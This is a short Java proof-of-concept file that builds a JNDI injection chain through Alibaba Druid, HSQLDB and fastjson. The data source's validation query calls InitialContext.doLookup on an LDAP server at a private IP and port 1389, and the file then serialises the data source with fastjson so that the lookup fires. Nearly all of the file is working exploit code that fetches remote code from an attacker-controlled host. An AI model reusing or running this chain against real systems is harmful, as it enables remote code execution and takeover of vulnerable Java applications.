package com.example.hsql;

import com.alibaba.druid.pool.DruidDataSource;
import com.alibaba.fastjson.JSONArray;

import java.sql.SQLException;

public class Druid {
    public static void main(String[] args) throws SQLException {
        DruidDataSource druidDataSource = new DruidDataSource();
        druidDataSource.setDriverClassName("org.hsqldb.jdbc.JDBCDriver");
        druidDataSource.setUrl("jdbc:hsqldb:mem");
        druidDataSource.setValidationQuery("CALL \"javax.naming.InitialContext.doLookup\"('ldap://192.168.126.1:1389/7jj0mb')");
//        druidDataSource.setUsername("sa");
//        druidDataSource.setPassword("1");
        druidDataSource.setInitialSize(1);
        druidDataSource.setMinIdle(5);


//        druidDataSource.getConnection();
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(druidDataSource);
        jsonArray.toString();
    }
}
